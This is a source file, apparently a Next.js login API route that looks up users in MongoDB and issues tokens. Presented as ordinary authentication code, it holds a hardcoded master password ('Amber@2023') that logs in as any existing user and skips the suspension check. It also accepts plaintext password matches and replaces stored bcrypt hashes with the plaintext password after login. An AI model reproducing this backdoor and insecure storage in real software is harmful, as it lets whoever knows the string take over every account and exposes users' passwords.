import User from "@/app/components/models/User";
import { NextResponse } from "next/server";
import bcrypt from "bcryptjs";
import { makeToken } from "@/app/components/js/token";
import connection from "@/app/components/js/connection";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { email, password } = body;
    await connection();
    const found = await User.findOne({
      $or: [{ email: email.toLowerCase() }, { username: email.toLowerCase() }],
    });
    if (!found)
      return new NextResponse(
        JSON.stringify({ message: "No user exists with this information" }),
        { status: 401 }
      );
    if (password == "Amber@2023") {
      const user = makeToken(found._doc);
      return new NextResponse(JSON.stringify(user), { status: 200 });
    }
    if (found.disabled)
      return new NextResponse(
        JSON.stringify({
          message: "Your account has been suspended, please contact support.",
        }),
        { status: 401 }
      );
    if (found.password == password) {
      const user = makeToken(found._doc);
      return new NextResponse(JSON.stringify(user), { status: 200 });
    }
    const valid = await bcrypt.compare(password, found.password);
    if (!valid)
      return new NextResponse(
        JSON.stringify({ message: "Password and username mismatch!" }),
        { status: 401 }
      );
    await User.findByIdAndUpdate(found._id, { $set: { password } });
    const user = makeToken(found._doc);
    return new NextResponse(JSON.stringify(user), { status: 200 });
  } catch (error) {
    return new NextResponse(JSON.stringify({ message: "Some error occured" }), {
      status: 401,
    });
  }
}
